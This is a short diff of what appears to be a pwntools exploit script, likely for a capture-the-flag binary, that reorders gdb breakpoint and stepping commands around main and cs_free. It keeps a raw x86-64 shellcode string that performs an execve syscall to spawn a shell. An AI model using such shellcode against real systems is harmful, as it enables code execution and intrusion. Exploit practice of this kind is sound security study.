@@ -2,18 +2,17 @@ from pwn import *
 #xor esi, esi
 #xor edx, edx
 #syscall
-
-COMMANDS = """
-b main
-continue
-b cs_free
+s = """b cs_free
 continue
 finish
 next
 next
 si
 si
-si
+si"""
+COMMANDS = """
+b main
+continue
 """
 shellcode = b"\x6A\x3B\x58\x31\xF6\x31\xD2\x0F\x05"
 
